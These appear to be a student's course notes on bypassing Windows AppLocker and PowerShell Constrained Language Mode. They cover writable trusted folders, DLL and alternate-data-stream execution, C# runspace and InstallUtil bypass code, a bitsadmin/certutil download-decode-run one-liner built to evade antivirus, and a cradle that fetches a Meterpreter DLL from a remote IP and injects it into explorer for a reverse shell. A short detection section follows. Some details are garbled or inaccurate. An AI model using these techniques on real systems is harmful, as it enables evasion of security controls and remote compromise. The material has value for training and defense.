### Application Whitelisting Theory

- `PsSetCreateProcessNotifyRoutineEx` is a MS kernel-mode API that registers a notification callback allowing the system to determine if the process may run
- **Applocker** helps control what applications can run on a system
	- By default, AppLocker policy only applies to code launched in a user's context. On Windows 10, Windows 11, and Windows Server 2016 or later, you can apply AppLocker policy to non-user processes, including those running as SYSTEM.
- **AppLocker** is included with all editions of Windows except Windows 10 version 1809 or earlier.
- Another whitelisting solution was introduced by MS. Windows Defender Application Control (WDAC) performs whitelisting actions in both user- and kernel-mode
- WDAC was introduced with Windows 10 and allows organizations to control which drivers and applications are allowed to run on their Windows clients.


##### Feature Availability of Applocker and WDAC
- https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/feature-availability

### 8.1.2 Applocker Setup and Rules

##### Rules
- filepath
- file hash (SHA256 Authenticode...code signing)
- digital signature (aka publisher)
	- allows version updates

##### Setup
- In the Local Group Policy Editor, we'll navigate to _Local Computer Policy_ -> _Computer Configuration_ -> _Windows Settings_ -> _Security Settings_ -> _Application Control Policies_ and select the _AppLocker_ item
- Configuration
	- Configure rule enforcement
	- set rule properties for Executable, Windows installer files, scripts, packaged apps

### 8.2 Basic Bypasses

#### 8.2.1 Trusted Folders

- use **AccessChk** from SysInternals to locate user-writable folders
- -w to locate writable directories, -u to suppress any errors and -s to recurse through all subdirectories
```cmd
accesschk.exe "user" C:\Windows -wus
```
- can then use `icacls` to determine directories where can write and execute like `C:\Windows\Tasks`
- another directory that has WD and RX permissions in the lab environment is `c:\windows\system32\spool\drivers\color\`

#### 8.2.2 Bypass with DLLs

- default ruleset doesn't protect against loading arbitrary DLLs
- create an unmanaged DLL like
```c
#include "stdafx.h"
#include <Windows.h>

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

extern "C" __declspec(dllexport) void run()
{
	MessageBoxA(NULL, "Execution happened", "Bypass", MB_OK);
}
```
- compile and use `rundll32` tool to execute `rundll32 <path to dll>\name.dll,run`
- GPO Advanced rule to enable DLL enforcement

##### Extra Mile:
- Code signing bypass example: https://forensicitguy.github.io/making-meterpreter-look-google-signed/
- other ways to embed a non-java payload with a signed msi?

#### 8.2.3 Alternate Data Streams

- **Alternate Data Stream (ADS)** is a binary file attribute that contains metadata
- can use this to append additional information to the original file
- Find a file in a trusted location that is writeable and executable
	- *TODO:* write a cmd script that finds files with these attributes
- Use `type` command to copy malicious content into an ADS
	- Example: `type test.js > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:test.js"`
	- use `wscript` and specify the ADS to get code execution

#### 8.2.4 Third Party Execution

- Check for 3rd party scripting engines (Perl, Python, etc...)
- "Even more interesting is the lack of enforcement against VBA code inside Microsoft Office documents. If a Microsoft Office document is saved to a non-whitelisted folder, AppLocker cannot restrict execution of its embedded macros, allowing for reuse of our previously developed tradecraft. This highlights the usefulness of Office documents in client-side attacks."

### 8.3 Bypassing Applocker with Powershell

#### Powershell language modes

PowerShell's language modes determine what scripts and commands can be executed in a given session. There are four primary language modes:

1. **Full Language Mode**:
    - **Description**: This mode provides full access to the PowerShell language. Users can run all cmdlets, functions, scripts, and access the .NET Framework.
    - **Restrictions**: None.
    - **Usage**: Suitable for administrators and trusted users who need full control.

2. **Constrained Language Mode**:
    - **Description**: This mode restricts some scripting capabilities, primarily to enhance security and prevent potentially malicious scripts from running.
    - **Restrictions**:
        - .NET types and methods are restricted to a safe list.
        - Only core cmdlets and functions are allowed.
        - No access to COM objects.
        - Limited access to the .NET Framework.
    - **Bypass**: To switch to Full Language Mode, a user with administrative privileges can change the execution policy using the `Set-ExecutionPolicy` cmdlet.

3. **Restricted Language Mode**:
    - **Description**: The most restricted mode, primarily used in environments like Just Enough Administration (JEA) to tightly control what scripts and commands can be executed.
    - **Restrictions**:
        - No user-defined functions, scripts, or workflows.
        - Only a subset of cmdlets and functions allowed.
        - No access to the .NET Framework or COM objects.
    - **Bypass**: Generally, cannot be bypassed directly. Administrators would need to reconfigure the session's language mode.

4. **NoLanguage Mode**:
    - **Description**: This mode completely disables the PowerShell scripting language. Only allowed cmdlets and functions can be executed.
    - **Restrictions**:
        - No script blocks, variables, functions, aliases, or expressions.
        - Only a predefined list of cmdlets and functions is allowed.
    - **Bypass**: Switching out of NoLanguage Mode requires administrative privileges to reconfigure the language mode.

### Changing Language Modes

Language modes are typically enforced in specific PowerShell sessions or environments. Here’s how you can change the language mode for a session:

```powershell
# To change the language mode, you need to update the LanguageMode property of the session state
$ExecutionContext.SessionState.LanguageMode = "FullLanguage"
$ExecutionContext.SessionState.LanguageMode = "ConstrainedLanguage"
$ExecutionContext.SessionState.LanguageMode = "RestrictedLanguage"
$ExecutionContext.SessionState.LanguageMode = "NoLanguage"
```

### Security Considerations

- **Full Language Mode**: Should be used with caution and restricted to trusted users and environments due to its unrestricted capabilities.
- **Constrained Language Mode**: Provides a balance between usability and security, making it suitable for less trusted environments.
- **Restricted and NoLanguage Modes**: Offer the highest levels of security and are ideal for tightly controlled administrative environments.

### Summary

PowerShell's language modes are crucial for controlling script execution and maintaining security in various environments. Understanding each mode's restrictions and capabilities helps in configuring PowerShell sessions appropriately based on security requirements.


### 8.3.2. Custom Runspaces

#### C\# App to create a Runspace to bypass Powershell constraints

```csharp
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

\\ Note: need to add this dll into Reference Assemblies
\\C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll.

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            PowerShell ps = PowerShell.Create();
			ps.Runspace = rs;
            String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\Tools\\test.txt";
			ps.AddScript(cmd);
			ps.Invoke();
			rs.Close();
        }
    }
}
```

- Can change the cmd string to perform actions like
	- run PowerUp from a web cradle
	- shellcode execution
- *Note:* need to verify that Applocker isn't blocking. Placing the .exe in c:\\windows\\tasks or another directory where the user and write and execute is required if Applocker or other whitelist blocking is enabled.

### 8.3.3. PowerShell CLM Bypass

`InstallUtil.exe` is a command-line utility that is part of the .NET Framework. It is primarily used for installing and uninstalling .NET assemblies, typically for Windows Services. However, like many legitimate tools, `InstallUtil.exe` can be abused by attackers for malicious purposes. Here are several ways in which `InstallUtil.exe` can be abused:

### 1. **Execution of Malicious Code**
Attackers can create a .NET assembly with custom code in the `Install` and `Uninstall` methods. When `InstallUtil.exe` is run against this assembly, it will execute the malicious code contained in these methods.

#### Example:
A simple .NET assembly with malicious code in the `Install` method:
```csharp
using System;
using System.ComponentModel;
using System.Configuration.Install;
using System.Diagnostics;

namespace MaliciousCode
{
    [RunInstaller(true)]
    public class MaliciousInstaller : Installer
    {
        public override void Install(IDictionary stateSaver)
        {
            base.Install(stateSaver);
            Process.Start("cmd.exe"); // or any other malicious command
        }

        public override void Uninstall(IDictionary savedState)
        {
            base.Uninstall(savedState);
            Process.Start("cmd.exe"); // or any other malicious command
        }
    }
}
```
Compile this code into an assembly, and then run it using `InstallUtil.exe`:
```
InstallUtil.exe MaliciousCode.dll
```
POC to bypass Powershell CLM:
```
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("This is the main method which is a decoy");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\Tools\\test.txt";
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            ps.AddScript(cmd);

            ps.Invoke();

            rs.Close();
        }
    }
}
```
To run the code: `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Tools\Bypass.exe`
### 2. **Bypassing Application Whitelisting**
Since `InstallUtil.exe` is a legitimate Microsoft-signed binary, it is often whitelisted by application whitelisting solutions. Attackers can exploit this to execute their payloads without triggering alarms.

### 3. **Fileless Malware**
`InstallUtil.exe` can be used to load and execute code directly from memory, which can be part of a fileless malware attack, making it harder for traditional antivirus solutions to detect.

### 4. **Persistence Mechanism**
Attackers can use `InstallUtil.exe` to ensure their malicious code is executed upon system reboots or service restarts by installing it as a service.

### Detection and Mitigation
1. **Monitoring and Logging:** Monitor the execution of `InstallUtil.exe` with tools like Sysmon or Endpoint Detection and Response (EDR) solutions. Look for unusual usage patterns or executions from unexpected directories.
2. **Application Whitelisting:** Configure whitelisting solutions to allow `InstallUtil.exe` only when it is invoked by legitimate software installation processes.
3. **Code Signing:** Enforce code signing for all scripts and binaries executed in your environment.
4. **Endpoint Protection:** Use endpoint protection solutions that can detect and prevent the execution of malicious payloads, even those executed by legitimate tools.

### Example of Detection Rule
A sample YARA rule to detect unusual usage of `InstallUtil.exe`:
```yara
rule Suspicious_InstallUtil_Usage
{
    meta:
        description = "Detects unusual usage of InstallUtil.exe"
    strings:
        $s1 = "InstallUtil.exe"
        $s2 = "-install" // commonly used flag with InstallUtil
    condition:
        all of them
}
```

In summary, while `InstallUtil.exe` is a useful utility for legitimate administrative tasks, it can be exploited by attackers to execute malicious code, bypass security controls, and maintain persistence. Proper monitoring, logging, and security configurations are essential to detect and mitigate such abuses.

#### CLM Bypass Process

- Using Bypass.exe as developed in the course material
- *Issues:*
	- have to download the exe
	- ensure the exe is not flagged by AV/EDR
- Bypass AV obfuscate the exe during download by base64 encoding it either on a separate Windows machine or Linux (might need to pipe to iconv if on Linux)
```cmd
certutil -encode C:\<path to exe> <filename>.txt
```
- Powershell command to encode, but certutil will make the exe look more like a security certificate
```powershell
[Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\<path to exe>")) > C:<path to text ouput file>
```
- To transfer the encoded exe to the victim machine, one can use `bitsadmin` rather than `certutil` which will trigger an AV scan
```cmd
bitsadmin /Transfer myJob http://<ip>/file.txt C:<path to save encoded file>
```
- Now decode the encoded  file
```cmd
certutil -decode encoded.txt Bypass.exe
```
- Then run
```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U Bypass.exe
```
- As a one-liner:
```cmd 
bitsadmin /Transfer myJob http://<ip>/file.txt C:<path to save encoded file> &&certutil -decode encoded.txt Bypass.exe && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U Bypass.exe
```

### 8.3.4. Reflective Injection Returns

- using a 64-bit Meterpreter dll and the `Invoke-ReflectivePEInjection.ps1` script to obtain a reverse shell and bypass Applocker DLL rules
```cmd
String cmd = "$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/met.dll');(New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/Invoke-ReflectivePEInjection.ps1') | IEX; $procid = (Get-Process -Name explorer).Id; Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid";
```

## 8.4. Bypassing AppLocker with C\#


